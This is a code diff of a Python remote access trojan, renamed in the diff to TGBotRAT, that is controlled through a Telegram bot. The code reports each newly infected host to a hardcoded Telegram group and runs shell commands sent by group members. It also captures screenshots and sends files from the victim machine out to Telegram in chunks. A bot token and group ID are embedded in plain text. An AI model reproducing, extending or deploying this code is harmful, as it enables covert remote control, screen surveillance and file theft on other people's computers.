@@ -8,56 +8,7 @@ import pyautogui
 import platform
 
 
-class CenterHandlerExec:
-    def init(self):
-        pass
-
-    def get_platform(self):
-        sys_platform = platform.platform().lower()
-        if "windows" in sys_platform:
-            return "windows"
-        elif "linux" in sys_platform:
-            return "linux"
-        elif "macos" in sys_platform:
-            return "macos"
-        else:
-            return "other"
-
-    def screenshot(self):
-        try:
-            screenshot = pyautogui.screenshot()
-            img_byte_arr = io.BytesIO()
-            screenshot.save(img_byte_arr, format='PNG')
-            # img_byte_arr = img_byte_arr.getvalue()
-            img_byte_arr.seek(0)
-            return img_byte_arr, True
-        except:
-            return '', False
-
-    def command_exec(self, command):
-        command_shell = " ".join(command).lstrip(" ").replace("/", "\\")
-        pf = re.search("^([a-zA-Z]:)", command[0])
-        if command[0] == "cd" or pf:
-            if pf:
-                newdir = pf.group(1)
-            else:
-                newdir = "".join(command[1:]).lstrip(" ")
-
-            try:
-                os.chdir(newdir)
-            except FileNotFoundError:
-                return 404, f"报错如下：找不到目录 --> {command_shell}"
-            except Exception as e:
-                return 404, f"cd命令出错，错误信息如下：{e}"
-        process = subprocess.Popen(command_shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output, error = process.communicate()
-        if output:
-            return output.decode('gbk', errors='ignore')
-        if error:
-            return error.decode('gbk', errors='ignore')
-
-
-class TGBotShell:
+class TGBotRAT:
     def __init__(self, tgbot_token):
         self.TGBotToken = tgbot_token
         self.UUID = None
@@ -68,24 +19,26 @@ class TGBotShell:
         self.GroupID = "-1002035867279"
         self.UserID = {}
         self.offset = None
-        self.CenterHandlerExec = CenterHandlerExec()
+        self.max_send_size = 50 * 1024 * 1024
+        self.get_platform = platform.platform()
 
     def help(self):
         return f"""
-目前支持命令如下：
+支持的命令：
     help                                                    查看帮助信息
     getuuids                                                查看所有存活主机信息
     <uuids> <shell options>                                 执行相关指令
     
     shell options选项如下：
         set uuid <new uuid>                                 设置新的uuid
-        screenshot                                          截图
+        screenshot                                          获取实时截图
         upload <current filepath> <target filepath>         上传文件至指定目标地址
-        download <target filepath> <current filepath>       上传文件至指定目标地址
+        download <target filepath>                          下载指定目标文件（最大支持50MB）
         <shell命令>                                          执行相关系统命令
         
 注意：群组中执行命令格式统一为 {self.ChatName} <支持的命令> <shell options>
 """
+
     def get_chat_members(self):
         try:
             data = requests.get(
@@ -110,10 +63,9 @@ class TGBotShell:
         try:
             response = requests.get(f"https://api.telegram.org/bot{self.TGBotToken}/getUpdates",
                                     params=param).json()
-        except Exception as e:
-            return 404, f"获取最新数据失败：{e}"
+        except:
+            return False
         else:
-
             if self.offset is None and response["ok"] and len(response['result']) > 0 and response['result'][-1][
                 'update_id'] != "":
                 self.offset = response['result'][-1]['update_id']
@@ -142,23 +94,27 @@ class TGBotShell:
                                 updates.append({'chatid': message['chat']['id'],
                                                 'username': [message['from']['id']],
                                                 'text': 'getuuids'})
-                            else:
-                                updates.append({'chatid': message['chat']['id'],
-                                                'username': [message['from']['id']],
-                                                'text': 'help'})
+                            # else:
+                            #     updates.append({'chatid': message['chat']['id'],
+                            #                     'username': [message['from']['id']],
+                            #                     'text': 'help'})
                         self.offset = response['result'][-1]['update_id']
                 return updates
             else:
                 return False
 
-    def send_chat_msg(self, updates):
+    def send_chat_msg(self, updates, before_text="", flag=True):
         msg = ""
         for item_user in updates["username"]:
             msg += f"@{self.UserID[item_user]} "
-        msg += "\n" + updates["text"]
+        if flag:
+            msg += f"\n{before_text}主机UUID：{self.UUID}\n系统及版本：{self.get_platform}\n" + updates["text"]
+        else:
+            msg += f"{before_text}\n" + updates["text"]
         try:
             requests.post(
-                f"https://api.telegram.org/bot{self.TGBotToken}/sendMessage?chat_id={updates['chatid']}&text={msg}")
+                f"https://api.telegram.org/bot{self.TGBotToken}/sendMessage?chat_id={updates['chatid']}&parse_mode={updates['type']}",
+                data={"text": msg})
         except:
             pass
 
@@ -166,12 +122,10 @@ class TGBotShell:
         msg = ""
         for item_user in updates["username"]:
             msg += f"@{self.UserID[item_user]} "
-        msg += f"\n主机：{self.UUID}\n" + "screenshot命令执行成功！\n"
+        msg += f"\n主机UUID：{self.UUID}\n系统及版本：{self.get_platform}\n" + updates["text"]
         try:
             files = {
-                "filename": "screen.png",
-                "Content-Type": "images/png",
-                "photo": updates['img']
+                "photo": ("screen.png",updates['img'])
             }
             requests.post(
                 f"https://api.telegram.org/bot{self.TGBotToken}/sendPhoto",
@@ -179,40 +133,23 @@ class TGBotShell:
         except:
             pass
 
-    def send_chat_file(self, updates, flag=0):
+    def send_chat_file(self, updates):
         msg = ""
-        file = {'document': {}}
-        header = {"Content-Type": "multipart/form-data"}
-        if updates["success"]:
-            if flag == 1:
-                file['document']["screenshot.png"] = updates["img"]
-                header["Content-Type"] = "images/png"
-            elif flag == 2:
-                file['document']["screenvideo.mp4"] = updates["video"]
-                header["Content-Type"] = "video/mp4"
-            elif flag == 3:
-                file["file"] = updates["file"]
-            else:
-                file = None
-        else:
-            file = None
         for item_user in updates["username"]:
             msg += f"@{self.UserID[item_user]} "
-        if updates["success"]:
-            msg += f"\n主机：{self.UUID}\n" + "执行成功！结果如下：\n"
-        else:
-            msg += "\n" + "执行失败！"
+        msg += f"\n主机UUID：{self.UUID}\n系统及版本：{self.get_platform}\n" + updates["text"]
+        file = {
+            "document": (updates['file']['filename'], updates['file']['filecontent'])
+        }
+        print(file)
         try:
-            print("发送")
-            print(file)
-            print(header)
-            requests.post(
-                f"https://api.telegram.org/bot{self.TGBotToken}/sendPhoto?chat_id={updates['chatid']}&caption={msg}",
-                files=file,
-                headers=header)
-        except:
-            print("失败")
-            pass
+            print("发送文件")
+            s = requests.post(
+                f"https://api.telegram.org/bot{self.TGBotToken}/sendDocument",
+                params={"chat_id": updates['chatid'], "caption": msg}, files=file)
+            print(s.json())
+        except Exception as e:
+            return False, f"发送文件失败！\n详情信息如下：{e}"
 
         # response = requests.post(f"https://api.telegram.org/bot{self.TGBotToken}/sendVideo",
         #                          params={"chat_id": self.tg_info["message"]["chat"]["id"]}, files=files,
@@ -226,51 +163,110 @@ class TGBotShell:
     def handler_center(self, updates):
         for item_user in updates:
             cmd_list = str(item_user["text"]).split(" ")
+            sendmsg = {
+                "chatid": item_user["chatid"],
+                "username": item_user['username'],
+                'type': '',
+            }
+            print(cmd_list[0], cmd_list)
             if cmd_list[0] == "help":
-                self.send_chat_msg(
-                    {"chatid": item_user["chatid"], "username": item_user['username'],
-                     "text": self.help()})
+                sendmsg["type"] = 'Markdown'
+                sendmsg["text"] = f"目前支持的命令如下：\n```text\n{self.help()}```"
+                self.send_chat_msg(sendmsg)
             elif cmd_list[0] == "getuuids":
-                self.send_chat_msg(
-                    {"chatid": item_user["chatid"], "username": item_user['username'],
-                     "text": f"主机：{self.UUID}\n状态：存活！"})
+                sendmsg["text"] = f"状态：存活！"
+                self.send_chat_msg(sendmsg)
             elif cmd_list[0] == "set":
                 if cmd_list[1] == "uuid":
                     self.UUID = cmd_list[2].replace(" ", "")
-                    self.send_chat_msg(
-                        {"chatid": item_user["chatid"], "username": item_user['username'],
-                         "text": f"主机：{self.UUID}\n已成功更新UUID会话标识！"})
+                    sendmsg["text"] = f"已成功更新UUID会话标识！"
                 else:
-                    self.send_chat_msg(
-                        {"chatid": item_user["chatid"], "username": item_user['username'],
-                         "text": f"主机：{self.UUID}\n该命令 {cmd_list} 并不存在，请输入命令 help 后查看语法！"})
+                    sendmsg["text"] = f"该命令 {cmd_list} 并不存在，请使用命令 help 查看语法后操作！"
+                self.send_chat_msg(sendmsg)
             elif cmd_list[0] == "screenshot":
-                result, flag = self.CenterHandlerExec.screenshot()
+                result, flag = self.screenshot()
                 if flag:
-                    self.send_chat_img(
-                        {"chatid": item_user["chatid"], "username": item_user['username'], "img": result})
+                    sendmsg["img"] = result
+                    sendmsg["text"] = f"screenshot命令执行成功！"
+                    self.send_chat_img(sendmsg)
                 else:
-                    self.send_chat_msg(
-                        {"chatid": item_user["chatid"], "username": item_user['username'],
-                         "text": f"主机：{self.UUID}\n执行upload！"})
+                    sendmsg["text"] = f"screenshot命令执行失败！\n详细信息如下：{result}"
+                    self.send_chat_msg(sendmsg)
             elif cmd_list[0] == "upload":
-                self.send_chat_msg(
-                    {"chatid": item_user["chatid"], "username": item_user['username'],
-                     "text": f"主机：{self.UUID}\n执行upload！"})
+                self.send_chat_msg(sendmsg)
             elif cmd_list[0] == "download":
-                self.send_chat_msg(
-                    {"chatid": item_user["chatid"], "username": item_user['username'],
-                     "text": f"主机：{self.UUID}\n执行download！"})
+                self.download(item_user, " ".join(cmd_list[1:]).lstrip(" "))
             elif cmd_list[0] == "getinfo":
-                self.send_chat_msg(
-                    {"chatid": item_user["chatid"], "username": item_user['username'],
-                     "text": f"主机：{self.UUID}\n执行getinfo！"})
+                self.send_chat_msg(sendmsg)
             else:
-                result = self.CenterHandlerExec.command_exec(cmd_list)
-                self.send_chat_msg(
-                    {"chatid": item_user["chatid"], "username": item_user['username'],
-                     "text": f"主机：{self.UUID}\n执行系统命令成功！\n{result}"})
+                flag, result = self.command_exec(cmd_list)
+                sendmsg["type"] = "Markdown"
+                if flag:
+                    sendmsg["text"] = f"执行系统命令成功！\n```text\n{result}```"
+                else:
+                    sendmsg["text"] = f"执行系统命令失败！\n```text\n{result}```"
+                self.send_chat_msg(sendmsg)
 
+    def download(self, updates, t_filepath):
+        sendmsg = {
+            "chatid": updates["chatid"],
+            "username": updates['username'],
+            "file": {
+                "filename": os.path.basename(t_filepath)
+            }
+        }
+        if '/' in str(t_filepath).replace("\\\\", "\\").replace("\\", "/"):
+            try:
+                with open(file=t_filepath, mode="r", encoding="utf8") as f:
+                    filesize = os.path.getsize(t_filepath)
+                    i = 1
+                    while True:
+                        chunk = f.read(50 * 1024 * 1024)
+                        if not chunk:
+                            break
+                        sendmsg[
+                            'text'] = f"文件名：{sendmsg['file']['filename']} \n当前下载状态：已完成 {str(i)}/{str(1 if int(filesize / self.max_send_size) < 1 else int(filesize / self.max_send_size))}"
+                        sendmsg['file']['filecontent'] = chunk
+                        self.send_chat_file(sendmsg)
+                        i += 1
+            except Exception as e:
+                print(e)
+
+        else:
+            pass
+
+    def screenshot(self):
+        try:
+            screenshot = pyautogui.screenshot()
+            img_byte_arr = io.BytesIO()
+            screenshot.save(img_byte_arr, format='PNG')
+            img_byte_arr.seek(0)
+            return img_byte_arr, True
+        except Exception as e:
+            return e, False
+
+    def command_exec(self, command):
+        command_shell = " ".join(command).lstrip(" ")
+        pf = re.search("^([a-zA-Z]:)", command[0])
+        if command[0] == "cd" or pf:
+            command_shell = command_shell.replace("/", "\\")
+            if pf:
+                newdir = pf.group(1)
+            else:
+                newdir = "".join(command[1:]).lstrip(" ")
+            try:
+                os.chdir(newdir)
+            except FileNotFoundError as e:
+                return False, f"执行失败！\n原因：找不到目录\n系统错误详情：{e}"
+            except Exception as e:
+                return False, f"执行失败！\n系统错误详情：{e}"
+        result = subprocess.Popen(command_shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
+        output, error = result.communicate()
+        if output is not None:
+            return True, output.decode('gbk', errors='ignore')
+        if error is not None:
+            return False, error.decode('gbk', errors='ignore')
+        return True, "执行完毕！"
     def main(self):
         self.UUID = uuid.uuid4()
         flag = False
@@ -279,7 +275,8 @@ class TGBotShell:
             if not flag:
                 flag = True
                 self.send_chat_msg(
-                    {"chatid": self.GroupID, "username": self.UserID, "text": f"新的主机上线！UUID：{self.UUID}"})
+                    {"chatid": self.GroupID, "username": self.UserID, "text": "", "type": ""},
+                    before_text="新的主机上线！\n")
             updates = self.getUpdates()
             if updates:
                 self.handler_center(updates)
@@ -287,4 +284,4 @@ class TGBotShell:
 
 
 if __name__ == '__main__':
-    NewTgbot = TGBotShell(tgbot_token="7145600460:AAH8H9zt4jRe3Pog6WWfEUstiHFIvYI4ke8").main()
+    NewTgbot = TGBotRAT(tgbot_token="7145600460:AAH8H9zt4jRe3Pog6WWfEUstiHFIvYI4ke8").main()
